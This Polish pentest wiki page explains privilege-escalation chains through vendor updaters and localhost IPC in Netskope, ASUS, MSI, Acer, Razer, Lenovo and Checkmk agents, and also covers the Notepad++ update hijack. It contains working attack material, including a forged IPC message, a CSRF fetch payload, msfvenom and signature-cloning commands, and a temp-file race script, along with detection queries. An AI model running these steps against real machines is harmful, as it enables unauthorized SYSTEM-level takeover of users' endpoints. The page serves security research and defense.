# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę Windows local privilege escalation chains występujących w enterprise endpoint agents i updaterach, które udostępniają łatwo dostępną powierzchnię IPC oraz uprzywilejowany proces aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), gdzie użytkownik z niskimi uprawnieniami może wymusić enrollment na serwerze kontrolowanym przez attackera, a następnie dostarczyć złośliwy plik MSI instalowany przez usługę SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Najważniejsze idee, które można wykorzystać przeciwko podobnym produktom:
- Abuse localhost IPC uprzywilejowanej usługi, aby wymusić ponowny enrollment lub reconfiguration na serwerze attackera.
- Zaimplementuj update endpoints dostawcy, dostarcz rogue Trusted Root CA i skieruj updater do złośliwego, „signed” package.
- Omiń słabe kontrole signera (CN allow-lists), opcjonalne digest flags i liberalne MSI properties.
- Jeśli IPC jest „encrypted”, wyprowadź key/IV z machine identifiers dostępnych do odczytu przez wszystkich, przechowywanych w registry.
- Jeśli usługa ogranicza callerów na podstawie image path/process name, wykonaj injection do allow-listed process albo uruchom go w stanie suspended i zainicjalizuj swoją DLL za pomocą minimalnego thread-context patch.

---
## 1) Wymuszanie enrollment na serwerze attackera przez localhost IPC

Wiele agentów dostarcza user-mode UI process, który komunikuje się z usługą SYSTEM przez localhost TCP, używając JSON.

Zaobserwowano w Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Przygotuj JWT enrollment token, którego claims kontrolują backend host (np. AddonUrl). Użyj alg=None, aby podpis nie był wymagany.
2) Wyślij IPC message wywołujący provisioning command wraz z JWT i tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Service zaczyna wysyłać żądania do Twojego rogue server w celu enrollment/config, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Uwagi:
- Jeśli weryfikacja caller jest oparta na ścieżce/nazwie, zainicjuj żądanie z allow-listed vendor binary (zobacz §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Przejęcie update channel w celu uruchomienia kodu jako SYSTEM

Gdy client zacznie komunikować się z Twoim serverem, zaimplementuj oczekiwane endpointy i skieruj go do attacker MSI. Typowa sekwencja:

1) /v2/config/org/clientconfig → Zwróć JSON config z bardzo krótkim updater interval, np.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Zwraca certyfikat CA w formacie PEM. Service instaluje go w magazynie Local Machine Trusted Root.
3) /v2/checkupdate → Dostarcza metadane wskazujące na złośliwy MSI i fałszywą wersję.

Obejście typowych kontroli spotykanych w praktyce:
- Allow-list sygnatariusza CN: service może sprawdzać wyłącznie, czy Subject CN jest równy „netSkope Inc” lub „Netskope, Inc.”. Twój rogue CA może wystawić leaf z takim CN i podpisać MSI.
- Właściwość CERT_DIGEST: dodaj nieszkodliwą właściwość MSI o nazwie CERT_DIGEST. Podczas instalacji nie jest przeprowadzana walidacja.
- Opcjonalne wymuszanie digest: flaga konfiguracji (np. check_msi_digest=false) wyłącza dodatkową walidację kryptograficzną.

Rezultat: service działający jako SYSTEM instaluje MSI z lokalizacji
C:\ProgramData\Netskope\stAgent\data\*.msi
wykonując dowolny kod jako NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Wniosek dotyczący omijania poprawek: jeśli vendor zareaguje, tworząc allow-listę niewielkiego zbioru „zaufanych” domen zamiast kryptograficznie uwierzytelniać źródło aktualizacji, poszukaj redirectorów lub reverse proxy należących do vendora, które nadal umożliwiają sterowanie ruchem. W przypadku Netskope późniejsze publiczne badania wykazały, że allow-list z ery R129 nadal można było wykorzystać za pośrednictwem `rproxy.goskope.com`, które proxowało treści z Azure App Service kontrolowane przez attackera. Traktuj allow-listy hostname'ów jako przeszkodę, a nie granicę zaufania.<sup>[[14]](#references)</sup>

---
## 3) Fałszowanie zaszyfrowanych żądań IPC (jeśli występują)

Od R127 Netskope opakowywał JSON IPC w polu encryptData, które wygląda jak Base64. Reverse engineering wykazał użycie AES z kluczem/IV wyprowadzanymi z wartości rejestru odczytywalnych przez dowolnego usera:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers mogą odtworzyć szyfrowanie i wysyłać prawidłowe zaszyfrowane commands ze standardowego usera.<sup>[[1]](#references)[[2]](#references)</sup> Ogólna wskazówka: jeśli agent nagle zaczyna „szyfrować” swoje IPC, sprawdź device IDs, product GUIDs i install IDs w HKLM — mogą służyć jako materiał kryptograficzny.

---
## 4) Omijanie allow-list callerów IPC (kontrole ścieżki/nazwy)

Niektóre services próbują uwierzytelniać peer, ustalając PID połączenia TCP i porównując image path/name z allow-listą binariów vendora znajdujących się w Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne obejścia:
- DLL injection do procesu znajdującego się na allow-liście (np. nsdiag.exe) i proxy IPC z jego wnętrza.
- Uruchomienie binarium znajdującego się na allow-liście w stanie suspended oraz załadowanie proxy DLL bez CreateRemoteThread (zob. §5), aby spełnić reguły tamper protection wymuszane przez driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Produkty często zawierają driver minifilter/OB callbacks (np. Stadrv), który usuwa niebezpieczne prawa z handles do chronionych processes:
- Process: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ogranicza do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny loader user-mode respektujący te ograniczenia:
1) UtwórzProcess binarium vendora z CREATE_SUSPENDED.
2) Uzyskaj handles, które nadal są dozwolone: PROCESS_VM_WRITE | PROCESS_VM_OPERATION dla process oraz thread handle z THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (lub tylko THREAD_RESUME, jeśli patchujesz kod pod znanym RIP).
3) Nadpisz ntdll!NtContinue (lub inny wcześnie dostępny, gwarantowanie zmapowany thunk) krótkim stubem, który wywołuje LoadLibraryW ze ścieżką do twojego DLL, a następnie wraca do wcześniejszego miejsca.
4) ResumeThread, aby uruchomić stub w processie i załadować DLL.

Ponieważ nigdy nie użyłeś PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME wobec już chronionego procesu (to ty go utworzyłeś), polityka drivera zostaje spełniona.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktyczne tooling
- NachoVPN (plugin Netskope) automatyzuje rogue CA, podpisywanie złośliwego MSI i udostępnia wymagane endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope to customowy client IPC, który tworzy dowolne wiadomości IPC (opcjonalnie szyfrowane AES) i zawiera suspended-process injection, aby wysyłać je z binarium znajdującego się na allow-liście.<sup>[[4]](#references)</sup>

## 7) Szybki workflow triage dla nieznanych powierzchni updatera/IPC

W przypadku nowego endpoint agenta lub pakietu „helperów” do motherboarda szybki workflow zwykle wystarcza, aby określić, czy mamy do czynienia z obiecującym celem privesc:<sup>[[6]](#references)</sup>

1) Wyszczególnij listenery loopback i powiąż je z procesami vendora:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Wylicz potencjalne named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Zbierz dane routingu przechowywane w rejestrze, wykorzystywane przez serwery IPC oparte na pluginach:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Najpierw wyodrębnij nazwy endpointów, klucze JSON i identyfikatory poleceń z klienta działającego w trybie użytkownika. Spakowane frontend'y Electron/.NET często ujawniają pełny schemat:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Szukaj rzeczywistego predykatu zaufania, a nie tylko ścieżki kodu, która ostatecznie uruchamia proces:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Wzorce, które warto traktować priorytetowo:
- `CryptQueryObject`/parsowanie certyfikatów bez `WinVerifyTrust` zwykle oznacza, że „certyfikat istnieje” potraktowano jako „certyfikat jest zaufany”, co umożliwia klonowanie certyfikatów lub inne triki z fałszywym signerem.
- Sprawdzanie substring/suffix w `Origin`, `Referer`, URL-ach pobierania, nazwach procesów lub CN signerów nie jest uwierzytelnianiem. `contains(".vendor.com")` jest zwykle exploitable za pomocą kontrolowanych przez attackera domen łudząco podobnych do prawdziwych.
- Jeśli GUI z niskimi uprawnieniami decyduje, że „plik jest zaufany”, a broker SYSTEM jedynie korzysta z tego wyniku, spatchowanie lub reimplementacja DLL/JS po stronie klienta często całkowicie omija tę granicę (split validation w stylu Razer).
- Jeśli broker kopiuje payload do `%TEMP%`/`C:\Windows\Temp`, a następnie waliduje go lub planuje jego wykonanie z tej ścieżki, natychmiast testuj okna podmiany TOCTOU oraz sąsiednie moduły pluginów, które udostępniają alternatywne wrappery `ExecuteTask()` ze słabszymi checkami.<sup>[[6]](#references)</sup>

W przypadku targetów intensywnie korzystających z named pipes PipeViewer pozwala szybko wykryć słabe DACL-e i zdalnie osiągalne pipe’y, zanim zaczniesz szczegółowo odwracać protokół.<sup>[[11]](#references)</sup>

Jeśli target uwierzytelnia callerów wyłącznie na podstawie PID, ścieżki obrazu lub nazwy procesu, traktuj to raczej jako utrudnienie niż granicę: często wystarczy wstrzyknięcie kodu do legalnego klienta albo nawiązanie połączenia z procesu znajdującego się na allow-liście, aby spełnić checki serwera. W przypadku named pipes [ta strona o client impersonation i pipe abuse](named-pipe-client-impersonation.md) opisuje ten primitive bardziej szczegółowo.

---
## 8) Modular add-in brokers uwierzytelniające wyłącznie za pomocą podpisów vendora (wzorzec Lenovo Vantage)

Nowszą odmianą, którą warto sprawdzać, jest **signed-client RPC broker**: desktopowy proces Lenovo z niskimi uprawnieniami, podpisany przez Lenovo, komunikuje się z usługą SYSTEM, a usługa routuje komendy JSON do zestawu add-inów opisanych w XML znajdujących się w `%ProgramData%`. Po uzyskaniu code execution **wewnątrz dowolnego zaakceptowanego signed clienta** każdy kontrakt `runas="system"` staje się częścią twojej attack surface.<sup>[[15]](#references)</sup>

Wysokowartościowe primitive zaobserwowane podczas badań Lenovo Vantage:
- **Zaufanie do callera, ponieważ jest podpisany przez vendora**: researcherzy uzyskali uwierzytelniony kontekst, kopiując podpisany przez Lenovo EXE do zapisywalnego katalogu i spełniając warunek DLL side-load (`profapi.dll`), dzięki czemu arbitrary code uruchomił się wewnątrz klienta, któremu usługa już ufała.
- **Wykrywanie attack surface na podstawie manifestów**: add-iny są deklarowane w `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; kilka kontraktów działa jako `SYSTEM`, więc enumeracja tych manifestów często szybciej ujawnia rzeczywiste uprzywilejowane verbs niż odwracanie samego brokera.
- **Błędy per-command za uwierzytelnionym kanałem**: po wejściu do zaufanego klienta publiczne badania ujawniły path traversal + race conditions w verbach update/install, raw-SQL abuse w uprzywilejowanych bazach ustawień oraz oparte na substringach checki ścieżek rejestru, które umożliwiały zapisy poza zamierzonym hive’em.

Przydatny recon targetu:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktyczny wniosek: za każdym razem, gdy zestaw helperów udostępnia brokera, który najpierw uwierzytelnia **proces wywołujący**, a dopiero potem przekazuje żądania do dziesiątek poleceń pluginów/add-inów, nie poprzestawaj na obejściu początkowego sprawdzenia zaufania. Zrzuć tabelę manifestu/kontraktu i fuzzuj niezależnie każdy verb o wysokich uprawnieniach; uwierzytelniony kanał zwykle ukrywa kilka błędów drugiego etapu.

---
## 1) Browser-to-localhost CSRF przeciwko uprzywilejowanym HTTP API (ASUS DriverHub)

DriverHub dostarcza user-mode HTTP service (ADU.exe) na 127.0.0.1:53000, który oczekuje wywołań z przeglądarki pochodzących z https://driverhub.asus.com. Filtr originu wykonuje jedynie `string_contains(".asus.com")` na nagłówku Origin oraz na URL-ach pobierania ujawnianych przez `/asus/v1.0/*`. Dowolny host kontrolowany przez atakującego, taki jak `https://driverhub.asus.com.attacker.tld`, przechodzi więc sprawdzenie i może wysyłać żądania zmieniające stan za pomocą JavaScript.<sup>[[6]](#references)</sup> Zobacz [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md), aby poznać dodatkowe wzorce obchodzenia zabezpieczeń.

Praktyczny przebieg:
1) Zarejestruj domenę zawierającą `.asus.com` i umieść na niej złośliwą stronę internetową.
2) Użyj `fetch` lub XHR do wywołania uprzywilejowanego endpointu (np. `Reboot`, `UpdateApp`) pod adresem `http://127.0.0.1:53000`.
3) Wyślij body JSON oczekiwane przez handler – spakowany frontendowy JS pokazuje poniższy schemat.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Nawet przedstawiony poniżej PowerShell CLI działa poprawnie po sfałszowaniu nagłówka Origin na zaufaną wartość:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Każda wizyta w przeglądarce na stronie atakującego staje się zatem lokalnym CSRF wymagającym 1 kliknięcia (lub 0 kliknięć za pośrednictwem `onload`), który steruje helperem działającym jako SYSTEM.

---
## 2) Niebezpieczna weryfikacja podpisu kodu i klonowanie certyfikatu (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` pobiera dowolne pliki wykonywalne zdefiniowane w treści JSON i buforuje je w `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Walidacja URL pobierania ponownie wykorzystuje tę samą logikę podciągu, więc `http://updates.asus.com.attacker.tld:8000/payload.exe` zostaje zaakceptowany. Po pobraniu ADU.exe jedynie sprawdza, czy PE zawiera podpis oraz czy ciąg Subject pasuje do ASUS, a następnie go uruchamia – bez `WinVerifyTrust` i bez walidacji łańcucha.

Aby uzbroić ten mechanizm:
1) Utwórz payload (np. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sklonuj signer ASUS do niego (np. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Umieść `pwn.exe` na domenie podszywającej się pod `.asus.com` i uruchom UpdateApp za pomocą opisanego wyżej browser CSRF.

Ponieważ zarówno filtry Origin, jak i URL są oparte na podciągach, a sprawdzenie signera porównuje wyłącznie ciągi znaków, DriverHub pobiera i uruchamia binarkę atakującego w swoim uprzywilejowanym kontekście.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU w ścieżkach kopiowania i wykonywania aktualizera (MSI Center CMD_AutoUpdateSDK)

Usługa MSI Center działająca jako SYSTEM udostępnia protokół TCP, w którym każda ramka ma postać `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Główny komponent (Component ID `0f 27 00 00`) zawiera `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Jego handler:
1) Kopiuje dostarczony plik wykonywalny do `C:\Windows\Temp\MSI Center SDK.exe`.
2) Weryfikuje podpis za pomocą `CS_CommonAPI.EX_CA::Verify` (Subject certyfikatu musi być równy „MICRO-STAR INTERNATIONAL CO., LTD.”, a `WinVerifyTrust` musi zakończyć się powodzeniem).
3) Tworzy scheduled task uruchamiający plik tymczasowy jako SYSTEM z argumentami kontrolowanymi przez atakującego.

Skopiowany plik nie jest blokowany między weryfikacją a `ExecuteTask()`. Atakujący może:
- Wysłać Frame A wskazującą legalną binarkę podpisaną przez MSI (co gwarantuje pomyślne przejście sprawdzenia podpisu i zakolejkowanie taska).
- Wyścigowo wysyłać powtarzające się wiadomości Frame B wskazujące złośliwy payload i nadpisujące `MSI Center SDK.exe` tuż po zakończeniu weryfikacji.

Gdy scheduler uruchomi task, wykona nadpisany payload jako SYSTEM, mimo że zweryfikowany został oryginalny plik. Niezawodne wykorzystanie luki używa dwóch goroutines/wątków, które spamują `CMD_AutoUpdateSDK`, dopóki nie uda się wygrać okna TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Wykorzystanie niestandardowego IPC na poziomie SYSTEM i impersonation (MSI Center + Acer Control Centre)

### Zestawy poleceń TCP MSI Center
- Każdy plugin/DLL załadowany przez `MSI.CentralServer.exe` otrzymuje Component ID przechowywany w `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Pierwsze 4 bajty ramki wybierają ten komponent, umożliwiając atakującym kierowanie poleceń do dowolnych modułów.
- Pluginy mogą definiować własne task runnery. `Support\API_Support.dll` udostępnia `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i bezpośrednio wywołuje `API_Support.EX_Task::ExecuteTask()` bez żadnej walidacji podpisu – dowolny użytkownik lokalny może wskazać `C:\Users\<user>\Desktop\payload.exe` i deterministycznie uzyskać wykonanie jako SYSTEM.
- Sniffing loopback za pomocą Wireshark lub instrumentacja binarek .NET w dnSpy szybko ujawniają mapowanie komponent ↔ command; następnie niestandardowe klienty Go/Python mogą odtwarzać ramki.<sup>[[6]](#references)</sup>

### Named pipes Acer Control Centre i poziomy impersonation
- `ACCSvc.exe` (SYSTEM) udostępnia `\\.\pipe\treadstone_service_LightMode`, a jego discretionary ACL zezwala klientom zdalnym (np. `\\TARGET\pipe\treadstone_service_LightMode`) na dostęp. Wysłanie command ID `7` ze ścieżką pliku wywołuje procedurę usługi odpowiedzialną za uruchamianie procesów.
- Biblioteka klienta serializuje magiczny bajt terminatora (113) wraz z argumentami. Dynamiczna instrumentacja za pomocą Frida/`TsDotNetLib` (wskazówki dotyczące instrumentacji znajdują się w [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) pokazuje, że natywny handler mapuje tę wartość na `SECURITY_IMPERSONATION_LEVEL` oraz integrity SID przed wywołaniem `CreateProcessAsUser`.
- Zamiana 113 (`0x71`) na 114 (`0x72`) przełącza wykonanie do ogólnej gałęzi, która zachowuje pełny token SYSTEM i ustawia SID wysokiej integralności (`S-1-16-12288`). Uruchomiona binarka działa zatem jako nieograniczony SYSTEM, zarówno lokalnie, jak i między maszynami.
- Połącz to z udostępnioną flagą instalatora (`Setup.exe -nocheck`), aby uruchomić ACC nawet na laboratoryjnych maszynach wirtualnych i testować pipe bez sprzętu producenta.<sup>[[6]](#references)</sup>

Te błędy IPC pokazują, dlaczego usługi localhost muszą wymuszać wzajemne uwierzytelnianie (ALPC SIDs, filtry `ImpersonationLevel=Impersonation`, filtrowanie tokenów) oraz dlaczego każdy helper modułu służący do „uruchamiania dowolnej binarki” musi korzystać z tych samych mechanizmów weryfikacji signera.

---
## 3) Helpery COM/IPC typu „elevator” oparte na słabej walidacji w user-mode (Razer Synapse 4)

Razer Synapse 4 wprowadził kolejny użyteczny wzorzec z tej rodziny: użytkownik o niskich uprawnieniach może poprosić helper COM o uruchomienie procesu za pośrednictwem `RzUtility.Elevator`, podczas gdy decyzja dotycząca zaufania jest delegowana do biblioteki DLL działającej w user-mode (`simple_service.dll`), zamiast być solidnie egzekwowana wewnątrz uprzywilejowanej granicy.

Zaobserwowana ścieżka wykorzystania:
- Utwórz instancję obiektu COM `RzUtility.Elevator`.
- Wywołaj `LaunchProcessNoWait(<path>, "", 1)`, aby zażądać uruchomienia z podwyższonymi uprawnieniami.
- W publicznym PoC bramka weryfikacji podpisu PE wewnątrz `simple_service.dll` jest patchowana przed wysłaniem żądania, co umożliwia uruchomienie dowolnego pliku wykonywalnego wybranego przez atakującego.<sup>[[6]](#references)[[10]](#references)</sup>

Minimalne wywołanie PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Ogólny wniosek: podczas reverse engineeringu zestawów „helper” nie zatrzymuj się na localhost TCP ani named pipes. Sprawdź klasy COM o nazwach takich jak `Elevator`, `Launcher`, `Updater` lub `Utility`, a następnie zweryfikuj, czy uprzywilejowana usługa rzeczywiście waliduje docelowy plik binarny, czy jedynie ufa wynikowi obliczonemu przez podatną na modyfikacje bibliotekę DLL klienta działającą w user-mode. Ten wzorzec wykracza poza Razer: każdy podzielony projekt, w którym broker o wysokich uprawnieniach przyjmuje decyzję allow/deny ze strony o niskich uprawnieniach, jest potencjalnym privesc surface.


---
## Przewidywalne wykonywanie skryptu tymczasowego podczas naprawy MSI (Checkmk Agent / CVE-2024-0670)

Niektóre agenty Windows nadal implementują uprzywilejowane działania, zapisując tymczasowy plik `.cmd` w `C:\Windows\Temp` i wykonując go jako `SYSTEM`. Jeśli nazwa pliku jest przewidywalna, a usługa nie tworzy bezpiecznie istniejących już plików, użytkownik o niskich uprawnieniach może wcześniej utworzyć przyszły plik tymczasowy jako **read-only** i nakłonić uprzywilejowany proces do wykonania treści kontrolowanej przez atakującego zamiast jego własnego skryptu.

Zaobserwowano w podatnych buildach Checkmk Agent:
- wzorzec pliku tymczasowego: `cmk_all_<PID>_1.cmd`
- podatne gałęzie: `2.0.0`, `2.1.0`, `2.2.0`
- wyzwalacz: **repair** MSI zbuforowanego pakietu agenta<sup>[[8]](#references)[[9]](#references)</sup>

Praktyczny workflow:
1. Oszacuj realistyczny zakres PID na podstawie bieżących identyfikatorów procesów lub PID działającego agenta.
2. Zapisz krótki payload `.cmd` w formacie **ASCII** (`Set-Content -Encoding Ascii` lub przekierowanie w `cmd.exe`; unikaj wyjścia PowerShell w UTF-16 dla plików batch).
3. Rozmieść pliki `C:\Windows\Temp\cmk_all_<PID>_1.cmd` w całym potencjalnym zakresie i oznacz każdy plik jako read-only.
4. Uruchom repair zbuforowanego MSI, aby uprzywilejowana usługa spróbowała ponownie wygenerować, a następnie wykonała skrypt tymczasowy.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Jeśli podatny produkt został zainstalowany za pomocą Windows Installer, przed uruchomieniem naprawy przypisz wyglądający losowo buforowany plik MSI w `C:\Windows\Installer` do nazwy produktu:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Uwagi operacyjne:
- `qwinsta` jest przydatne, gdy `msiexec /fa` kończy się niepowodzeniem z nieinteraktywnej powłoki WinRM i trzeba ustalić, czy istniejąca sesja pulpitu/rozłączona sesja może prawidłowo wywołać naprawę.<sup>[[7]](#references)</sup>
- Ten wzorzec można uogólnić na inne endpoint agents i updaters, które **umieszczają tymczasowe skrypty w lokalizacjach z prawem zapisu dla wszystkich użytkowników, a następnie wykonują je jako SYSTEM**. Sprawdź przewidywalne nazwy, brak mechanizmu wyłącznego tworzenia oraz przepływy naprawy/aktualizacji, które można wywołać na żądanie.

---
## Zdalny supply-chain hijack przez słabą walidację updaters (WinGUp / Notepad++)

Od czerwca 2025 do grudnia 2025 attackers, którzy przejęli infrastrukturę hostingową obsługującą proces aktualizacji Notepad++, selektywnie dostarczali wybranym ofiarom złośliwe manifesty. Starsze updaters oparte na WinGUp nie weryfikowały w pełni autentyczności aktualizacji, więc złośliwa odpowiedź XML mogła przekierować klientów na URLs kontrolowane przez attackers. Ponieważ klient akceptował zawartość HTTPS bez wymuszania zarówno zaufanego łańcucha certyfikatów, jak i prawidłowego podpisu PE pobranego installera, ofiary pobierały i wykonywały trojanizowany NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Przepływ operacyjny (nie jest wymagany local exploit):
1. **Przechwycenie infrastruktury**: przejęcie CDN/hostingu i odpowiadanie na sprawdzenia aktualizacji metadanymi attackers wskazującymi złośliwy URL pobierania.
2. **Trojanizowany NSIS**: installer pobiera/wykonuje payload i wykorzystuje dwa łańcuchy wykonania:
- **Bring-your-own signed binary + sideload**: dołączenie podpisanego `BluetoothService.exe` firmy Bitdefender i umieszczenie złośliwego `log.dll` w jego ścieżce wyszukiwania. Po uruchomieniu podpisanego binary system Windows wykonuje sideload `log.dll`, który odszyfrowuje i ładuje refleksyjnie backdoor Chrysalis (chroniony przez Warbird + API hashing w celu utrudnienia static detection).
- **Scripted shellcode injection**: NSIS wykonuje skompilowany skrypt Lua, który używa Win32 APIs (np. `EnumWindowStationsW`) do wstrzyknięcia shellcode i wdrożenia Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Najważniejsze zalecenia dotyczące hardening/detection dla każdego auto-updatera:
- Wymuszaj **weryfikację certyfikatu + podpisu** pobranego installera (przypnij podpisującego vendora, odrzucaj niezgodny CN/łańcuch) oraz podpisuj sam update manifest (np. XMLDSig). Blokuj redirects kontrolowane przez manifest, chyba że zostały zwalidowane.
- Traktuj **BYO signed binary sideloading** jako punkt pivotu w detection po pobraniu: generuj alert, gdy podpisany EXE vendora ładuje nazwę DLL spoza swojej kanonicznej ścieżki instalacji (np. Bitdefender ładuje `log.dll` z Temp/Downloads), a także gdy updater umieszcza/wykonuje installers w lokalizacji tymczasowej z podpisami innymi niż vendor.
- Monitoruj **artefakty specyficzne dla malware** zaobserwowane w tym łańcuchu (przydatne jako ogólne punkty pivotu): mutex `Global\Jdhfv_1.0.1`, anomalne zapisy `gup.exe` do `%TEMP%` oraz etapy shellcode injection sterowane przez Lua.
- Notepad++ odpowiedział, wzmacniając WinGUp w wersji v8.8.9 i nowszych: zwracany XML jest teraz podpisany (XMLDSig), a nowsze buildy wymuszają weryfikację certyfikatu + podpisu pobranego installera zamiast ufać wyłącznie transportowi.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> uruchamiający instalator inny niż Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Wzorce te można uogólnić na każdy updater, który akceptuje niepodpisane manifesty lub nie przypina signerów instalatora — hijack sieci + malicious installer + BYO-signed sideloading prowadzą do zdalnego wykonania kodu pod przykrywką „zaufanych” aktualizacji.

---
## Referencje
